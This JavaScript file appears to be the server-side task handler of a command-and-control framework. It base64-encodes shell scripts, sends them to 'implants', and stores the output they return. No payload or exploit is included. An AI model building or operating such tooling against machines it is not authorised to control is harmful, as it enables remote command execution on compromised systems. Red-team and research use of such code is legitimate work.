//Shell Script Task Handler Constructor
export class TaskHandler {
  constructor(task) {
    this.task = task
  }
  getTask = async function (req, res) {
    let payload = JSON.parse(this.task.parameters).script
    let instruction = Buffer.from(payload).toString('base64')
    //add our task id to the payload
    instruction = `${this.task.id}:${instruction}`
    let display = `Shell Script: ${payload.replace(/\n/g,';')}`
    let task_display = db.prepare(`UPDATE tasks SET display = $display WHERE id = $task_id`)
    task_display.run({ task_id: this.task.id, display: display})
    this.task.display = display
    res.send(instruction)
  }
  taskIO = async function (req, res) {
    this.task.output = Buffer.from(req.body, 'base64').toString('utf8');
    this.task.completed_at = Date.now();
    console.log(`Task:${this.task.id} reponded with ${this.task.output}`);
    let task_io = db.prepare(`UPDATE tasks SET (output, completed_at) = ($output, $completed_at) WHERE id = $task_id`)
    task_io.run({ task_id: this.task.id, output: this.task.output, completed_at: this.task.completed_at })
    res.type('text/plain').send('success')
    io('task_complete', this.task)
    delete active_implant_handlers[this.task.id]
  }
}